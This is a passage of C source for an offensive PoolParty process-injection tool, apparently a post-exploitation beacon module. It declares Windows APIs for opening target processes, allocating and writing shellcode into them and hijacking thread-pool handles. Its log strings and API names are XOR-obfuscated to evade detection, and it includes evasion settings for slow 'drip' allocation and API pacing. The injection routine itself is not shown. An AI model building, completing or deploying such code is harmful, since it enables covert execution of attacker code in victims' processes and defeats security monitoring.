    FileCaseSensitiveInformation, // q; s: FILE_CASE_SENSITIVE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileLinkInformationEx, // s: FILE_LINK_INFORMATION_EX // since REDSTONE5
    FileLinkInformationExBypassAccessCheck, // (kernel-mode only); s: FILE_LINK_INFORMATION_EX
    FileStorageReserveIdInformation, // q; s: FILE_STORAGE_RESERVE_ID_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileCaseSensitiveInformationForceAccessCheck, // q; s: FILE_CASE_SENSITIVE_INFORMATION
    FileKnownFolderInformation, // q; s: FILE_KNOWN_FOLDER_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES) // since WIN11
    FileStatBasicInformation, // since 23H2
    FileId64ExtdDirectoryInformation,
    FileId64ExtdBothDirectoryInformation,
    FileIdAllExtdDirectoryInformation,
    FileIdAllExtdBothDirectoryInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;


typedef NTSTATUS (NTAPI* _NtSetInformationFile)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass
);


WINBASEAPI int WINAPI MSVCRT$rand(void);
WINBASEAPI void WINAPI MSVCRT$srand(unsigned int seed);
WINBASEAPI int __cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
WINBASEAPI int __cdecl MSVCRT$wcsncmp(const wchar_t *_lhs,const wchar_t *_rhs, size_t _MaxCount);
WINBASEAPI errno_t __cdecl MSVCRT$wcscpy_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
WINBASEAPI errno_t __cdecl MSVCRT$wcscat_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void *_Dst, const void *_Src, size_t _MaxCount);
WINBASEAPI void *__cdecl MSVCRT$memset(void *_Dst, int _Val, size_t _MaxCount);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINBASEAPI BOOL WINAPI KERNEL32$FlushInstructionCache(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize);
WINBASEAPI BOOL WINAPI KERNEL32$IsWow64Process(HANDLE hProcess, PBOOL Wow64Process);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);
WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
#ifdef PP_NEED_TP_IO
WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
#endif
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
#ifdef PP_NEED_TP_IO
WINBASEAPI VOID WINAPI KERNEL32$CloseThreadpoolIo(PTP_IO pio);
#endif
#ifdef PP_HIJACK_TIMER
WINBASEAPI VOID WINAPI KERNEL32$CloseThreadpoolTimer(PTP_TIMER pti);
WINBASEAPI VOID WINAPI KERNEL32$SetThreadpoolTimer(PTP_TIMER pti, PFILETIME pftDueTime, DWORD msPeriod, DWORD msWindowLength);
#endif
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
#if defined(PP_HIJACK_TIMER) || defined(PP_RESOLVE_POOL_IOCP)
WINBASEAPI BOOL WINAPI KERNEL32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
#endif
#ifdef PP_NEED_TP_IO
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI PTP_IO WINAPI KERNEL32$CreateThreadpoolIo(HANDLE fl, PTP_WIN32_IO_CALLBACK pfnio, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL WINAPI KERNEL32$GetOverlappedResult(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait);
#endif
#ifdef PP_HIJACK_TIMER
WINBASEAPI PTP_TIMER WINAPI KERNEL32$CreateThreadpoolTimer(PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
#endif
#ifdef PP_NEED_JOB
WINBASEAPI BOOL WINAPI KERNEL32$SetInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
WINBASEAPI BOOL WINAPI KERNEL32$AssignProcessToJobObject(HANDLE hJob, HANDLE hProcess);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateJobObjectA(LPSECURITY_ATTRIBUTES lpJobAttributes, LPCSTR lpName);
WINBASEAPI BOOL WINAPI KERNEL32$IsProcessInJob(HANDLE ProcessHandle, HANDLE JobHandle, PBOOL Result);
#endif
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId(VOID);
WINBASEAPI VOID WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME lpFileTime);
WINBASEAPI BOOL WINAPI KERNEL32$QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
WINBASEAPI VOID WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
WINBASEAPI VOID WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME lpSystemTime);
#ifdef PP_HIJACK_IOCP
WINBASEAPI HANDLE WINAPI KERNEL32$CreateIoCompletionPort(HANDLE FileHandle, HANDLE ExistingCompletionPort, ULONG_PTR CompletionKey, DWORD NumberOfConcurrentThreads);
#endif
#ifdef PP_HIJACK_TIMER
WINBASEAPI HANDLE WINAPI KERNEL32$CreateWaitableTimerExW(LPSECURITY_ATTRIBUTES lpTimerAttributes, LPCWSTR lpTimerName, DWORD dwFlags, DWORD dwDesiredAccess);
#endif
WINBASEAPI BOOL WINAPI KERNEL32$SwitchToThread(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

HANDLE m_p_hTargetPid = NULL;
DWORD m_dwTargetPid = 0;
PVOID m_ShellcodeAddress = NULL;
unsigned char * m_cShellcode = NULL;
int m_szShellcodeSize = 0;
DWORD m_dwApiDelayMs = 0;
BOOL m_bDripAlloc = FALSE;
DWORD m_dwDripDelayMs = 0;
BOOL m_bSanityOnly = FALSE;
BOOL m_bShellcodePublished = FALSE;
ULONG m_dwWfTypeIndex = 0;

void Inject(void);
static BOOL VariantSanityExtra(void);

typedef BOOL (WINAPI *_IsWow64Process2)(HANDLE hProcess, USHORT *pProcessMachine, USHORT *pNativeMachine);
typedef NTSTATUS (NTAPI *_RtlGetVersion)(POSVERSIONINFOW VersionInformation);

#define API_PACE_MAX_SEC 120
#define DRIP_DELAY_MAX_MS 1000

#define OBF_KEY_LEN 8
#define OBF_BUFSZ 256
static const unsigned char g_obfKey[OBF_KEY_LEN] = { 0xA7, 0x3C, 0x91, 0x5E, 0x2B, 0xD4, 0x68, 0xF1 };

static const unsigned char kFmtCannotOpen[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x68, 0xB5, 0x06, 0x9F, 0xC8, 0x48, 0xB1, 0x11, 0x5B, 0xB1, 0x06, 0xD1, 0xF7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B, 0xD0 };
// "[-] Cannot Open Process!"
static const unsigned char kFmtAllocFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x6A, 0xB8, 0x04, 0x9E, 0xC4, 0x5D, 0xE5, 0x3B, 0x78, 0xBC, 0x0D, 0x9D, 0xCB, 0x5F, 0xFE, 0x3A, 0x4E, 0x99, 0x0D, 0x9C, 0xC8, 0x4E, 0xE8, 0x7E, 0x6D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xB0 };
// "[-] AllocateShellcodeMemory Failed!"
static const unsigned char kFmtWriteFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7C, 0xA6, 0x01, 0x85, 0xC2, 0x6F, 0xF9, 0x3B, 0x47, 0xB8, 0x0B, 0x9E, 0xC3, 0x59, 0xB1, 0x18, 0x4A, 0xBD, 0x04, 0x94, 0xC3, 0x1D };
// "[-] WriteShellcode Failed!"
static const unsigned char kFmtWow64[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x2E, 0x59, 0xBB, 0x0B, 0x94, 0xD4, 0x4F, 0xB1, 0x37, 0x58, 0xF4, 0x3F, 0xBE, 0xF0, 0x0A, 0xA5, 0x7E, 0x04, 0xF4, 0x5B, 0xC3, 0x8A, 0x5E, 0xF8, 0x2A, 0x10, 0xF4, 0x10, 0xC7, 0x93, 0x1C, 0xFE, 0x30, 0x47, 0xAD, 0x46 };
// "[-] Target process is WOW64 / 32-bit; x64 only."
static const unsigned char kFmtHijackFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x6D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x00, 0x98, 0xCD, 0x5D, 0xF2, 0x35, 0x0B, 0xA0, 0x00, 0x83, 0xC2, 0x5D, 0xF5, 0x7E, 0x5B, 0xBB, 0x07, 0x9D, 0x87, 0x54, 0xF0, 0x30, 0x4F, 0xB8, 0x0D, 0xDF };
// "[-] Failed to hijack thread pool handle."
static const unsigned char kFmtProtectFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7D, 0xBD, 0x1A, 0x85, 0xD2, 0x5D, 0xFD, 0x0E, 0x59, 0xBB, 0x1C, 0x94, 0xC4, 0x48, 0xD4, 0x26, 0x0B, 0x92, 0x09, 0x98, 0xCB, 0x59, 0xF5, 0x7F };
// "[-] VirtualProtectEx Failed!"
static const unsigned char kFmtBadSc[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x62, 0xBA, 0x1E, 0x90, 0xCB, 0x55, 0xF5, 0x7E, 0x58, 0xBC, 0x0D, 0x9D, 0xCB, 0x5F, 0xFE, 0x3A, 0x4E, 0xF4, 0x0A, 0x84, 0xC1, 0x5A, 0xF4, 0x2C, 0x05 };
// "[-] Invalid shellcode buffer."
static const unsigned char kFmtSelfPid[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x79, 0xB1, 0x0E, 0x84, 0xD4, 0x55, 0xFF, 0x39, 0x0B, 0xA0, 0x07, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x85, 0xCF, 0x59, 0xB1, 0x3D, 0x5E, 0xA6, 0x1A, 0x94, 0xC9, 0x48, 0xB1, 0x2E, 0x59, 0xBB, 0x0B, 0x94, 0xD4, 0x4F, 0xBF };
// "[-] Refusing to target the current process."
static const unsigned char kFmtResolveFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x6D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x1A, 0x94, 0xD4, 0x53, 0xFD, 0x28, 0x4E, 0xF4, 0x1A, 0x94, 0xD6, 0x49, 0xF8, 0x2C, 0x4E, 0xB0, 0x48, 0xB0, 0xF7, 0x75, 0xBF };
// "[-] Failed to resolve required API."
static const unsigned char kFmtRemoteAllocFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x79, 0xB1, 0x05, 0x9E, 0xD3, 0x59, 0xB1, 0x3F, 0x47, 0xB8, 0x07, 0x92, 0xC6, 0x48, 0xF8, 0x31, 0x45, 0xF4, 0x0E, 0x90, 0xCE, 0x50, 0xF4, 0x3A, 0x05 };
// "[-] Remote allocation failed."
static const unsigned char kFmtRemoteWriteFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x79, 0xB1, 0x05, 0x9E, 0xD3, 0x59, 0xB1, 0x29, 0x59, 0xBD, 0x1C, 0x94, 0x87, 0x5A, 0xF0, 0x37, 0x47, 0xB1, 0x0C, 0xDF };
// "[-] Remote write failed."
static const unsigned char kFmtTriggerFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xA6, 0x01, 0x96, 0xC0, 0x59, 0xE3, 0x7E, 0x58, 0xB1, 0x1C, 0x84, 0xD7, 0x1C, 0xF7, 0x3F, 0x42, 0xB8, 0x0D, 0x95, 0x89 };
// "[-] Trigger setup failed."
static const unsigned char kFmtStart[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF4, 0x48, 0xF0, 0x2C, 0x5F, 0xBD, 0x06, 0x96, 0x87, 0x6C, 0xFE, 0x31, 0x47, 0x84, 0x09, 0x83, 0xD3, 0x45, 0xB1, 0x3F, 0x5F, 0xA0, 0x09, 0x92, 0xCC, 0x1C, 0xF0, 0x39, 0x4A, 0xBD, 0x06, 0x82, 0xD3, 0x1C, 0xE1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x1C, 0xF8, 0x3A, 0x11, 0xF4, 0x4D, 0x95, 0xA7 };
// "[INFO] \tStarting PoolParty attack against process id: %d"
static const unsigned char kFmtDone[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF7, 0x53, 0xFE, 0x32, 0x7B, 0xB5, 0x1A, 0x85, 0xDE, 0x1C, 0xF0, 0x2A, 0x5F, 0xB5, 0x0B, 0x9A, 0x87, 0x4D, 0xE4, 0x3B, 0x5E, 0xB1, 0x0C, 0xDF };
// "[INFO] \tPoolParty attack queued."
static const unsigned char kFmtScSize[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF4, 0x54, 0xF4, 0x32, 0x47, 0xB7, 0x07, 0x95, 0xC2, 0x1C, 0xC2, 0x37, 0x51, 0xB1, 0x52, 0xD1, 0x82, 0x58, 0xB1, 0x3C, 0x52, 0xA0, 0x0D, 0x82, 0xA7 };
// "[INFO] \tShellcode Size: %d bytes"
static const unsigned char kFmtHandle[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x6E, 0xF4, 0x2A, 0x59, 0xBD, 0x0D, 0x87, 0xC2, 0x58, 0xB1, 0x36, 0x4A, 0xBA, 0x0C, 0x9D, 0xC2, 0x1C, 0xE5, 0x31, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B };
// "[INFO]   Retrieved handle to the target process"
static const unsigned char kFmtAlloc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x7D, 0xFD, 0x32, 0x44, 0xB7, 0x09, 0x85, 0xC2, 0x58, 0xB1, 0x2D, 0x43, 0xB1, 0x04, 0x9D, 0xC4, 0x53, 0xF5, 0x3B, 0x0B, 0xB9, 0x0D, 0x9C, 0xC8, 0x4E, 0xE8, 0x7E, 0x42, 0xBA, 0x48, 0x85, 0xCF, 0x59, 0xB1, 0x2A, 0x4A, 0xA6, 0x0F, 0x94, 0xD3, 0x1C, 0xE1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x06, 0xB1, 0x7B, 0x5B, 0xD4 };
// "[INFO]   Allocated shellcode memory in the target process: %p"
static const unsigned char kFmtWrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x6B, 0xE3, 0x37, 0x5F, 0xA0, 0x0D, 0x9F, 0x87, 0x4F, 0xF9, 0x3B, 0x47, 0xB8, 0x0B, 0x9E, 0xC3, 0x59, 0xB1, 0x2A, 0x44, 0xF4, 0x1C, 0x99, 0xC2, 0x1C, 0xE5, 0x3F, 0x59, 0xB3, 0x0D, 0x85, 0x87, 0x4C, 0xE3, 0x31, 0x48, 0xB1, 0x1B, 0x82, 0xA7 };
// "[INFO]   Written shellcode to the target process"
static const unsigned char kFmtDrip[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x4E, 0xF8, 0x2E, 0x0B, 0xB5, 0x04, 0x9D, 0xC8, 0x5F, 0xF0, 0x2A, 0x42, 0xBB, 0x06, 0xCB, 0x87, 0x19, 0xF5, 0x7E, 0x5B, 0xB5, 0x0F, 0x94, 0xD4, 0x10, 0xB1, 0x7B, 0x4F, 0xF4, 0x05, 0x82, 0x87, 0x5E, 0xF4, 0x2A, 0x5C, 0xB1, 0x0D, 0x9F, 0x87, 0x4C, 0xF0, 0x39, 0x4E, 0xA7, 0x68 };
// "[INFO] \tDrip allocation: %d pages, %d ms between pages"
#if defined(PP_HIJACK_IOCP) || defined(PP_RESOLVE_POOL_IOCP)
static const unsigned char kFmtHijackIocp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x74, 0xF8, 0x34, 0x4A, 0xB7, 0x03, 0x94, 0xC3, 0x1C, 0xD8, 0x71, 0x64, 0xF4, 0x0B, 0x9E, 0xCA, 0x4C, 0xFD, 0x3B, 0x5F, 0xBD, 0x07, 0x9F, 0x87, 0x54, 0xF0, 0x30, 0x4F, 0xB8, 0x0D, 0xD1, 0xC1, 0x4E, 0xFE, 0x33, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B };
// "[INFO]   Hijacked I/O completion handle from the target process"
static const unsigned char kTypeIoCompletion[] = { 0xEE, 0x3C, 0xFE, 0x5E, 0x68, 0xD4, 0x07, 0xF1, 0xCA, 0x3C, 0xE1, 0x5E, 0x47, 0xD4, 0x0D, 0xF1, 0xD3, 0x3C, 0xF8, 0x5E, 0x44, 0xD4, 0x06, 0xF1, 0xA7, 0x3C };
// L"IoCompletion"
#endif
#if defined(PP_HIJACK_TIMER) || defined(PP_RESOLVE_POOL_IOCP)
static const unsigned char kTypeWorkerFactory[] = { 0xF3, 0x3C, 0xE1, 0x5E, 0x7C, 0xD4, 0x07, 0xF1, 0xD5, 0x3C, 0xFA, 0x5E, 0x4E, 0xD4, 0x1A, 0xF1, 0xE1, 0x3C, 0xF0, 0x5E, 0x48, 0xD4, 0x1C, 0xF1, 0xC8, 0x3C, 0xE3, 0x5E, 0x52, 0xD4, 0x68, 0xF1 };
// L"TpWorkerFactory"
#endif
#ifdef PP_HIJACK_TIMER
static const unsigned char kTypeIRTimer[] = { 0xEE, 0x3C, 0xC3, 0x5E, 0x7F, 0xD4, 0x01, 0xF1, 0xCA, 0x3C, 0xF4, 0x5E, 0x59, 0xD4, 0x68, 0xF1 };
// L"IRTimer"
#endif
#ifdef PP_NEED_ALPC
static const unsigned char kAlpcPrefix[] = { 0xFB, 0x3C, 0xC3, 0x5E, 0x7B, 0xD4, 0x2B, 0xF1, 0x87, 0x3C, 0xD2, 0x5E, 0x44, 0xD4, 0x06, 0xF1, 0xD3, 0x3C, 0xE3, 0x5E, 0x44, 0xD4, 0x04, 0xF1, 0xFB, 0x3C, 0x91, 0x5E };
// L"\\RPC Control\\"
#endif
static const unsigned char kModNtdll[] = { 0xC9, 0x48, 0xF5, 0x32, 0x47, 0xFA, 0x0C, 0x9D, 0xCB, 0x3C };
// "ntdll.dll"
static const unsigned char kApiNtQueryObject[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E, 0xA6, 0x11, 0xBE, 0xC5, 0x56, 0xF4, 0x3D, 0x5F, 0xD4 };
// "NtQueryObject"
static const unsigned char kApiNtQueryInformationProcess[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E, 0xA6, 0x11, 0xB8, 0xC9, 0x5A, 0xFE, 0x2C, 0x46, 0xB5, 0x1C, 0x98, 0xC8, 0x52, 0xC1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x3C };
// "NtQueryInformationProcess"
#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
static const unsigned char kApiNtQueryInformationWorkerFactory[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E, 0xA6, 0x11, 0xB8, 0xC9, 0x5A, 0xFE, 0x2C, 0x46, 0xB5, 0x1C, 0x98, 0xC8, 0x52, 0xC6, 0x31, 0x59, 0xBF, 0x0D, 0x83, 0xE1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xF1 };
// "NtQueryInformationWorkerFactory"
#endif
static const unsigned char kFmtClampDelay[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x59, 0xFD, 0x3F, 0x52, 0xF4, 0x0B, 0x9D, 0xC6, 0x51, 0xE1, 0x3B, 0x4F, 0xF4, 0x1C, 0x9E, 0x87, 0x0D, 0xA3, 0x6E, 0x0B, 0xA7, 0x0D, 0x92, 0xC8, 0x52, 0xF5, 0x2D, 0x0B, 0xA4, 0x0D, 0x83, 0x87, 0x4C, 0xF0, 0x2B, 0x58, 0xB1, 0x46 };
// "[INFO] \tDelay clamped to 120 seconds per pause."
static const unsigned char kFmtClampDrip[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x4E, 0xF8, 0x2E, 0x0B, 0xB0, 0x0D, 0x9D, 0xC6, 0x45, 0xB1, 0x3D, 0x47, 0xB5, 0x05, 0x81, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x59, 0xC1, 0x97, 0x0C, 0xB1, 0x33, 0x58, 0xF4, 0x18, 0x94, 0xD5, 0x1C, 0xE1, 0x3F, 0x4C, 0xB1, 0x46 };
// "[INFO] \tDrip delay clamped to 1000 ms per page."
static const unsigned char kFmtSanityPass[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xB5, 0x06, 0x98, 0xD3, 0x45, 0xAB, 0x7E, 0x7B, 0x95, 0x3B, 0xA2 };
// "[+] Sanity: PASS"
static const unsigned char kFmtSanityFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x78, 0xB5, 0x06, 0x98, 0xD3, 0x45, 0xAB, 0x7E, 0x6D, 0x95, 0x21, 0xBD };
// "[-] Sanity: FAIL"
static const unsigned char kFmtSuggestV7[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xD3, 0x4E, 0xE8, 0x7E, 0x5D, 0xB5, 0x1A, 0x98, 0xC6, 0x52, 0xE5, 0x7E, 0x1C, 0xF8, 0x48, 0x9E, 0xD5, 0x1C, 0xF0, 0x30, 0x44, 0xA0, 0x00, 0x94, 0xD5, 0x1C, 0xC1, 0x17, 0x6F, 0xFA };
// "[+] Suggestion: try variant 7, or another PID."
static const unsigned char kFmtSuggestPid[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xD7, 0x55, 0xF2, 0x35, 0x0B, 0xB5, 0x48, 0x95, 0xCE, 0x5A, 0xF7, 0x3B, 0x59, 0xB1, 0x06, 0x85, 0x87, 0x50, 0xF8, 0x28, 0x4E, 0xF4, 0x10, 0xC7, 0x93, 0x1C, 0xC1, 0x17, 0x6F, 0xFA };
// "[+] Suggestion: pick a different live x64 PID."
static const unsigned char kFmtSuggestNoPool[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x99, 0xC6, 0x4F, 0xB1, 0x30, 0x44, 0xF4, 0x3F, 0x98, 0xC9, 0x58, 0xFE, 0x29, 0x58, 0xF4, 0x1C, 0x99, 0xD5, 0x59, 0xF0, 0x3A, 0x0B, 0xA4, 0x07, 0x9E, 0xCB, 0x07, 0xB1, 0x2E, 0x42, 0xB7, 0x03, 0xD1, 0xC6, 0x52, 0xFE, 0x2A, 0x43, 0xB1, 0x1A, 0xD1, 0xF7, 0x75, 0xD5, 0x70 };
// "[+] Suggestion: target has no Windows thread pool; pick another PID."
static const unsigned char kFmtSuggestLayout[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC9, 0x48, 0xF5, 0x32, 0x47, 0xF4, 0x04, 0x90, 0xDE, 0x53, 0xE4, 0x2A, 0x0B, 0xB9, 0x01, 0x82, 0xCA, 0x5D, 0xE5, 0x3D, 0x43, 0xEF, 0x48, 0x95, 0xC8, 0x1C, 0xFF, 0x31, 0x5F, 0xF4, 0x1A, 0x94, 0xD3, 0x4E, 0xE8, 0x7E, 0x5D, 0xB5, 0x1A, 0x98, 0xC6, 0x52, 0xE5, 0x7E, 0x13, 0xF4, 0x07, 0x9F, 0x87, 0x48, 0xF9, 0x37, 0x58, 0xF4, 0x00, 0x9E, 0xD4, 0x48, 0xBF };
// "[+] Suggestion: ntdll layout mismatch; do not retry variant 8 on this host."
static const unsigned char kFmtSuggestTemp[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC5, 0x59, 0xF0, 0x3D, 0x44, 0xBA, 0x48, 0x92, 0xC6, 0x52, 0xFF, 0x31, 0x5F, 0xF4, 0x1F, 0x83, 0xCE, 0x48, 0xF4, 0x7E, 0x5F, 0xB1, 0x05, 0x81, 0x9C, 0x1C, 0xE5, 0x2C, 0x52, 0xF4, 0x1E, 0x90, 0xD5, 0x55, 0xF0, 0x30, 0x5F, 0xF4, 0x5F, 0xDF };
// "[+] Suggestion: beacon cannot write temp; try variant 7."
static const unsigned char kFmtSuggestAlpc[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC4, 0x5D, 0xFF, 0x30, 0x44, 0xA0, 0x48, 0x92, 0xD5, 0x59, 0xF0, 0x2A, 0x4E, 0xF4, 0x29, 0xBD, 0xF7, 0x7F, 0xB1, 0x2E, 0x44, 0xA6, 0x1C, 0xCA, 0x87, 0x48, 0xE3, 0x27, 0x0B, 0xA2, 0x09, 0x83, 0xCE, 0x5D, 0xFF, 0x2A, 0x0B, 0xE3, 0x46 };
// "[+] Suggestion: cannot create ALPC port; try variant 7."
